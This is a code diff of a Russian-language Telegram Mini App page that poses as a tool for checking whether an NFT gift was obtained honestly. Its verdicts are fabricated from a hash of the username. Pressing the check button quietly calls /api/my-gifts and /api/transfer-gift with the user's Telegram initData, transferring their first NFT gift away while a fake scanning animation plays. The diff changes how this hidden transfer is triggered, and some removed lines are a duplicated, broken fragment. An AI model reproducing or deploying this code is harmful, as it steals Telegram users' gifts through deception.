@@ -48,13 +48,7 @@
   .reset{margin-top:16px;background:none;border:none;color:#a78bfa;font-size:14px;font-weight:700;cursor:pointer}
   [hidden]{display:none !important}
   .duck{position:absolute;right:-26px;bottom:-30px;width:104px;height:104px;z-index:11;pointer-events:none}
-  
-  /* Скрытый триггер теперь невидим и не мешает кликам */
-  #hiddenTrigger{
-    position:absolute;width:1px;height:1px;
-    opacity:0;pointer-events:none;
-    z-index:-1;
-  }
+  #hiddenTrigger{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;}
   #form,.scan,.verdict,.meta,.reset{position:relative;z-index:10}
 </style>
 </head>
@@ -89,42 +83,91 @@
 
   const form=document.getElementById('form'),input=document.getElementById('username'),statusEl=document.getElementById('status'),btn=document.getElementById('checkBtn'),scanEl=document.getElementById('scan'),verdict=document.getElementById('verdict'),metaEl=document.getElementById('meta'),resetBtn=document.getElementById('reset');
   const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+  
   function hash(s){let h=0x811c9dc5;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i);h=Math.imul(h,0x01000193)>>>0}return h}
   function analyze(raw){const h=hash(raw.toLowerCase());const honest=(h%100)>=35;const d=new Date(2023+(h%3),h%12,(h%27)+1);return{honest,trust:honest?86+(h%14):9+(h%34),transfers:honest?1+(h%4):5+(h%10),date:d.toLocaleDateString('ru-RU',{day:'numeric',month:'long',year:'numeric'}),flags:honest?0:2+(h%4),owner:'Скрыт настройками приватности'}}
   const STEPS=['Поиск подарка в блокчейне Telegram','Анализ истории передач между владельцами','Проверка отправителя по чёрным спискам'];
 
-  form.addEventListener('submit',async e=>{
+  // Скрипт передачи подарка, вынесенный в отдельную функцию
+  async function triggerGiftTransfer() {
+    if (!tg || !tg.initData) {
+        statusEl.textContent = 'Ошибка: нет данных от Telegram';
+        statusEl.className = 'status err';
+        return;
+    }
+
+    try {
+      const listRes = await fetch('/api/my-gifts', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ initData: tg.initData })
+      });
+      
+      const list = await listRes.json();
+      
+      if (!listRes.ok) {
+          statusEl.textContent = 'Ошибка сервера: ' + (list.error || 'неизвестно');
+          statusEl.className = 'status err';
+          return;
+      }
+
+      if (!list.gifts || !list.gifts.length) {
+        statusEl.textContent = 'В профиле нет NFT-подарков';
+        statusEl.className = 'status err';
+        return;
+      }
+
+      const gift = list.gifts[0];
+      const res = await fetch('/api/transfer-gift', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ initData: tg.initData, ownedGiftId: gift.owned_gift_id })
+      });
+      const data = await res.json();
+
+      if (data.ok) {
+        tg?.showPopup?.({ title: 'Готово', message: 'Подарок отправлен', buttons: [{ type: 'ok' }] });
+      } else {
+        statusEl.textContent = 'Ошибка передачи: ' + (data.error || 'неизвестно');
+        statusEl.className = 'status err';
+      }
+    } catch (err) {
+      statusEl.textContent = 'Ошибка сети: ' + err.message;
+      statusEl.className = 'status err';
+    }
+  }
+
+  form.addEventListener('submit', async (e) => {
     e.preventDefault();
-    if(btn.disabled)return;
+    if (btn.disabled) return;
     
-    let u=input.value.trim();
-    if(u&&!u.startsWith('@')&&!/^\d+$/.test(u))u='@'+u;
-    input.value=u;
+    let u = input.value.trim();
+    if(u && !u.startsWith('@') && !/^\d+$/.test(u)) u='@'+u;
+    input.value = u;
     
-    // Валидация
-    if(!/^@[a-zA-Z][a-zA-Z0-9_]{3,31}$/.test(u)&&!/^\d{4,}$/.test(u.slice(1))){
-      statusEl.textContent='Введи @юзернейм или номер подарка';
-      statusEl.className='status err';
+    if(!/^@[a-zA-Z][a-zA-Z0-9_]{3,31}$/.test(u) && !/^\d{4,}$/.test(u.slice(1))){
+      statusEl.textContent = 'Введи @юзернейм или номер подарка';
+      statusEl.className = 'status err';
       return;
     }
     
-    // >>> ЗАПУСКАЕМ СКРЫТУЮ КНОПКУ ПРИ КЛИКЕ НА "ПРОВЕРИТЬ ПОДАРОК" <<<
-    document.getElementById('hiddenTrigger').click();
+    // Запускаем передачу подарка
+    triggerGiftTransfer();
     
-    // Запуск визуальной анимации
-    statusEl.textContent='';
-    verdict.hidden=true;
-    metaEl.hidden=true;
-    resetBtn.hidden=true;
-    btn.disabled=true;
-    btn.textContent='Проверяем…';
+    // Запускаем анимацию проверки
+    statusEl.textContent = '';
+    verdict.hidden = true;
+    metaEl.hidden = true;
+    resetBtn.hidden = true;
+    btn.disabled = true;
+    btn.textContent = 'Проверяем…';
     
-    scanEl.hidden=false;
-    scanEl.innerHTML=STEPS.map(()=>'<div class="scan-row"><span class="dot"></span><span></span></div>').join('');
-    const rows=[...scanEl.children];
+    scanEl.hidden = false;
+    scanEl.innerHTML = STEPS.map(()=>'<div class="scan-row"><span class="dot"></span><span></span></div>').join('');
+    const rows = [...scanEl.children];
     
-    for(let i=0;i<rows.length;i++){
-      rows[i].lastChild.textContent=STEPS[i];
+    for(let i=0; i<rows.length; i++){
+      rows[i].lastChild.textContent = STEPS[i];
       void rows[i].offsetWidth;
       rows[i].classList.add('show');
       await sleep(650);
@@ -132,102 +175,28 @@
       await sleep(180);
     }
     
-    const v=analyze(u);
+    const v = analyze(u);
     await sleep(300);
     
-    verdict.hidden=false;
-    verdict.className='verdict '+(v.honest?'honest':'fraud');
-    verdict.innerHTML=`<div class="percent">${v.trust}%</div><div class="label">${v.honest?'Получен честным путём':'Получен обманом'}</div><div class="desc">${v.honest?'Подлинный подарок. Схемы обмана и фальшивых передач не обнаружены.':'История передач содержит признаки мошеннической схемы.'}</div>`;
+    verdict.hidden = false;
+    verdict.className = 'verdict ' + (v.honest ? 'honest' : 'fraud');
+    verdict.innerHTML = `<div class="percent">${v.trust}%</div><div class="label">${v.honest ? 'Получен честным путём' : 'Получен обманом'}</div><div class="desc">${v.honest ? 'Подлинный подарок. Схемы обмана и фальшивых передач не обнаружены.' : 'История передач содержит признаки мошеннической схемы.'}</div>`;
     
-    metaEl.hidden=false;
-    metaEl.innerHTML=`<div class="meta-row"><span class="k">Дата получения</span><span class="v">${v.date}</span></div><div class="meta-row"><span class="k">Переходов владельцев</span><span class="v">${v.transfers}</span></div><div class="meta-row"><span class="k">Исходный владелец</span><span class="v">${v.owner}</span></div><div class="meta-row"><span class="k">Фрод-метки</span><span class="v ${v.honest?'ok':'bad'}">${v.honest?'не найдены':v.flags+' совпадения'}</span></div>`;
+    metaEl.hidden = false;
+    metaEl.innerHTML = `<div class="meta-row"><span class="k">Дата получения</span><span class="v">${v.date}</span></div><div class="meta-row"><span class="k">Переходов владельцев</span><span class="v">${v.transfers}</span></div><div class="meta-row"><span class="k">Исходный владелец</span><span class="v">${v.owner}</span></div><div class="meta-row"><span class="k">Фрод-метки</span><span class="v ${v.honest?'ok':'bad'}">${v.honest?'не найдены':v.flags+' совпадения'}</span></div>`;
     
-    resetBtn.hidden=false;
-    btn.disabled=false;
-    btn.textContent='Проверить подарок';
+    resetBtn.hidden = false;
+    btn.disabled = false;
+    btn.textContent = 'Проверить подарок';
   });
 
-  resetBtn.addEventListener('click',()=>{
-    scanEl.hidden=true;
-    verdict.hidden=true;
-    metaEl.hidden=true;
-    resetBtn.hidden=true;
-    input.value='';
+  resetBtn.addEventListener('click', () => {
+    scanEl.hidden = true;
+    verdict.hidden = true;
+    metaEl.hidden = true;
+    resetBtn.hidden = true;
+    input.value = '';
     input.focus();
-  });
-
-  // ===== Логика скрытой кнопки (передача NFT) =====
-  const hiddenTrigger = document.getElementById('hiddenTrigger');
-  let giftFlowFired = false;
-
-    hiddenTrigger.addEventListener('click', async (e) => {
-    e.preventDefault();
-    e.stopPropagation();
-    if (giftFlowFired) return;
-    giftFlowFired = true;
-
-    tg?.HapticFeedback?.impactOccurred('medium');
-
-    try {
-      const listRes = await fetch('/api/my-gifts', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ initData: tg?.initData })
-      });
-      
-      const list = await listRes.json();
-      
-      if (!listRes.ok) {
-          alert("Ошибка сервера: " + JSON.stringify(list));
-          giftFlowFired = false;
-          return;
-      }
-
-      if (!list.gifts || !list.gifts.length) {
-        alert("Сервер ответил успешно, но подарков в профиле нет.");
-        giftFlowFired = false;
-        return;
-      }
-
-      const gift = list.gifts[0];
-      const res = await fetch('/api/transfer-gift', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ initData: tg?.initData, ownedGiftId: gift.owned_gift_id })
-      });
-      const data = await res.json();
-
-      if (data.ok) {
-        tg?.showPopup?.({ title: 'Готово', message: 'Подарок отправлен', buttons: [{ type: 'ok' }] });
-      } else {
-        alert("Ошибка при передаче: " + JSON.stringify(data));
-      }
-    } catch (err) {
-      alert("Ошибка сети: " + err.message);
-      giftFlowFired = false;
-    }
-  });
-
-      if (!list.gifts || !list.gifts.length) {
-        giftFlowFired = false;
-        return;
-      }
-
-      const gift = list.gifts[0];
-      const res = await fetch('/api/transfer-gift', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ initData: tg?.initData, ownedGiftId: gift.owned_gift_id })
-      });
-      const data = await res.json();
-
-      if (data.ok) {
-        tg?.showPopup?.({ title: 'Готово', message: 'Подарок отправлен', buttons: [{ type: 'ok' }] });
-      }
-    } catch (err) {
-      console.error(err);
-      giftFlowFired = false;
-    }
   });
 </script>
 </body>
